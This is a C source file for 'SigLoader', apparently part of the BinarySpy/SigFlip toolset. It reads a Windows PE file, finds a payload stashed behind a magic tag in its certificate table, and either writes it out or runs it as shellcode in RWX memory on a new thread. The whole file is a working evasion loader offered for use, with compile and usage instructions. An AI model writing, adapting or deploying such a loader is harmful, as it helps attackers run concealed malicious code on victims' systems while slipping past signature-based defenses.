/*
 * BinarySpy SigLoader - C Loader Template
 * Extracts and executes data embedded by SigFlip
 * 
 * Format: MAGIC_TAG + 4-byte size (little-endian) + raw_data + padding
 * 
 * Compile (x64): x86_64-w64-mingw32-gcc -o SigLoader_x64.exe SigLoader.c
 * Compile (x86): i686-w64-mingw32-gcc -o SigLoader_x86.exe SigLoader.c
 * 
 * Usage: SigLoader.exe <pe_file> [output_file]
 * 
 * Example:
 *   SigLoader.exe modified_pe.exe               # Extract and execute
 *   SigLoader.exe modified_pe.exe output.bin   # Extract and save
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Magic tag to identify embedded data - must match sigflip_python.py */
#define MAGIC_TAG "BinarySpy"
#define MAGIC_TAG_LEN 9

/* Read entire file into memory */
unsigned char* read_file(const char* path, size_t* size) {
    HANDLE hFile = CreateFileA(
        path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[!] Cannot open file: %s (Error: %d)\n", path, GetLastError());
        return NULL;
    }
    
    *size = GetFileSize(hFile, NULL);
    if (*size == 0) {
        CloseHandle(hFile);
        return NULL;
    }
    
    unsigned char* data = (unsigned char*)malloc(*size);
    if (!data) {
        CloseHandle(hFile);
        return NULL;
    }
    
    DWORD bytes_read;
    if (!ReadFile(hFile, data, (DWORD)*size, &bytes_read, NULL) || bytes_read != *size) {
        free(data);
        CloseHandle(hFile);
        return NULL;
    }
    
    CloseHandle(hFile);
    return data;
}

/* Find embedded data in PE certificate table */
unsigned char* find_embedded_data(unsigned char* pe_data, size_t pe_size, size_t* data_size) {
    /* Check DOS signature */
    if (pe_data[0] != 'M' || pe_data[1] != 'Z') {
        fprintf(stderr, "[!] Not a valid PE file (missing MZ signature)\n");
        return NULL;
    }
    
    /* Get e_lfanew (offset to PE header) */
    DWORD e_lfanew = *(DWORD*)(pe_data + 60);
    if (e_lfanew >= pe_size) {
        fprintf(stderr, "[!] Invalid e_lfanew offset\n");
        return NULL;
    }
    
    /* Check PE signature */
    if (*(DWORD*)(pe_data + e_lfanew) != 0x00004550) { /* "PE\0\0" */
        fprintf(stderr, "[!] Not a valid PE file (missing PE signature)\n");
        return NULL;
    }
    
    /* Get Optional Header offset */
    DWORD opt_offset = e_lfanew + 4 + 20; /* PE signature (4) + IMAGE_FILE_HEADER (20) */
    
    /* Check magic (PE32 or PE32+) */
    WORD magic = *(WORD*)(pe_data + opt_offset);
    DWORD sec_dir_offset;
    
    if (magic == 0x10b) { /* PE32 */
        sec_dir_offset = opt_offset + 128;
    } else if (magic == 0x20b) { /* PE32+ */
        sec_dir_offset = opt_offset + 144;
    } else {
        fprintf(stderr, "[!] Unknown PE magic: 0x%04X\n", magic);
        return NULL;
    }
    
    /* Get Security Directory (Certificate Table) */
    DWORD cert_rva = *(DWORD*)(pe_data + sec_dir_offset);
    DWORD cert_size = *(DWORD*)(pe_data + sec_dir_offset + 4);
    
    if (cert_rva == 0 || cert_size == 0) {
        fprintf(stderr, "[!] No certificate table found\n");
        return NULL;
    }
    
    printf("[*] Certificate table: offset=0x%X, size=%d bytes\n", cert_rva, cert_size);
    
    /* Search for magic tag in certificate table area */
    unsigned char* search_start = pe_data + cert_rva;
    size_t search_size = cert_size;
    unsigned char* magic_ptr = NULL;
    
    /* Use memmem equivalent for Windows */
    for (size_t i = 0; i <= search_size - MAGIC_TAG_LEN; i++) {
        if (memcmp(search_start + i, MAGIC_TAG, MAGIC_TAG_LEN) == 0) {
            magic_ptr = search_start + i;
            break;
        }
    }
    
    if (!magic_ptr) {
        fprintf(stderr, "[!] Magic tag '%s' not found in certificate table\n", MAGIC_TAG);
        fprintf(stderr, "[!] The file may not contain embedded data from SigFlip\n");
        return NULL;
    }
    
    printf("[+] Found magic tag at file offset: 0x%llX\n", (unsigned long long)(magic_ptr - pe_data));
    
    /* Read data size (4 bytes after magic tag, little-endian) */
    unsigned char* size_ptr = magic_ptr + MAGIC_TAG_LEN;
    *data_size = *(DWORD*)(size_ptr);
    
    printf("[*] Embedded data size: %zu bytes\n", *data_size);
    
    /* Extract data */
    unsigned char* data_start = size_ptr + 4;
    unsigned char* data = (unsigned char*)malloc(*data_size);
    if (!data) {
        fprintf(stderr, "[!] Memory allocation failed\n");
        return NULL;
    }
    
    memcpy(data, data_start, *data_size);
    return data;
}

/* Execute data as shellcode */
int execute_shellcode(unsigned char* data, size_t size) {
    printf("[*] Allocating executable memory (%zu bytes)...\n", size);
    
    LPVOID exec_mem = VirtualAlloc(
        NULL,
        size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!exec_mem) {
        fprintf(stderr, "[!] VirtualAlloc failed: %d\n", GetLastError());
        return -1;
    }
    
    /* Copy data to executable memory */
    memcpy(exec_mem, data, size);
    
    printf("[*] Executing at 0x%p...\n", exec_mem);
    
    /* Create thread to execute */
    DWORD thread_id;
    HANDLE hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)exec_mem,
        NULL,
        0,
        &thread_id
    );
    
    if (!hThread) {
        fprintf(stderr, "[!] CreateThread failed: %d\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }
    
    printf("[+] Thread created (ID: %d)\n", thread_id);
    
    /* Wait for thread to complete */
    WaitForSingleObject(hThread, INFINITE);
    
    DWORD exit_code = 0;
    GetExitCodeThread(hThread, &exit_code);
    printf("[*] Thread exited with code: %d\n", exit_code);
    
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    
    return 0;
}

/* Save data to file with auto-rename */
int save_to_file(const char* path, unsigned char* data, size_t size) {
    char final_path[MAX_PATH];
    strcpy(final_path, path);
    
    /* Ensure .bin extension */
    size_t len = strlen(final_path);
    if (len < 4 || _stricmp(final_path + len - 4, ".bin") != 0) {
        strcat(final_path, ".bin");
    }
    
    /* Auto-rename if file exists */
    int counter = 1;
    while (GetFileAttributesA(final_path) != INVALID_FILE_ATTRIBUTES) {
        char base_path[MAX_PATH];
        strcpy(base_path, path);
        char* dot = strrchr(base_path, '.');
        if (dot) *dot = '\0';
        
        sprintf(final_path, "%s_%d.bin", base_path, counter);
        counter++;
    }
    
    if (strcmp(final_path, path) != 0) {
        printf("[*] File renamed to: %s\n", final_path);
    }
    
    FILE* f = fopen(final_path, "wb");
    if (!f) {
        fprintf(stderr, "[!] Cannot create file: %s\n", final_path);
        return -1;
    }
    
    fwrite(data, 1, size, f);
    fclose(f);
    
    printf("[+] Saved %zu bytes to: %s\n", size, final_path);
    return 0;
}

/* Print banner */
void print_banner(void) {
    printf("\n");
    printf("  ____       _ _____     _       _____ _                 \n");
    printf(" |  _ \\ __ _| |_   _| __(_)_ __ |  ___| | _____      __  \n");
    printf(" | |_) / _` | | | || '__| | '_ \\| |_  | |/ _ \\ \\ /\\ / /  \n");
    printf(" |  _ < (_| | | | || |  | | |_) |  _| | |  __/\\ V  V /   \n");
    printf(" |_| \\_\\__,_|_| |_||_|  |_| .__/|_|   |_|\\___| \\_/\_/    \n");
    printf("                           |_|  SigLoader v1.1           \n");
    printf("\n");
}

/* Print usage */
void print_usage(const char* prog) {
    printf("Usage: %s <pe_file> [output_file]\n\n", prog);
    printf("Arguments:\n");
    printf("  pe_file       Path to the PE file modified by SigFlip\n");
    printf("  output_file   (Optional) Save extracted data to file instead of executing\n\n");
    printf("Examples:\n");
    printf("  %s modified.exe                    # Extract and execute embedded data\n", prog);
    printf("  %s modified.exe extracted.bin      # Extract and save to file\n", prog);
}

int main(int argc, char* argv[]) {
    print_banner();
    
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    const char* pe_path = argv[1];
    const char* output_path = (argc >= 3) ? argv[2] : NULL;
    
    printf("[*] Target PE: %s\n", pe_path);
    if (output_path) {
        printf("[*] Output: %s\n", output_path);
    }
    printf("\n");
    
    /* Read PE file */
    size_t pe_size = 0;
    unsigned char* pe_data = read_file(pe_path, &pe_size);
    if (!pe_data) {
        fprintf(stderr, "[!] Failed to read PE file\n");
        return 1;
    }
    printf("[*] File size: %zu bytes\n", pe_size);
    
    /* Find and extract embedded data */
    size_t data_size = 0;
    unsigned char* data = find_embedded_data(pe_data, pe_size, &data_size);
    
    if (!data) {
        fprintf(stderr, "[!] Failed to extract data from PE\n");
        free(pe_data);
        return 1;
    }
    
    printf("[+] Extracted data: %zu bytes\n", data_size);
    free(pe_data); /* No longer need PE data */
    
    /* Print first 16 bytes */
    printf("[*] First 16 bytes: ");
    for (size_t i = 0; i < 16 && i < data_size; i++) {
        printf("%02X ", data[i]);
    }
    printf("\n\n");
    
    int result;
    
    if (output_path) {
        /* Save to file */
        result = save_to_file(output_path, data, data_size);
    } else {
        /* Execute as shellcode */
        printf("[!] WARNING: Executing embedded data as shellcode!\n\n");
        result = execute_shellcode(data, data_size);
    }
    
    free(data);
    
    return result;
}
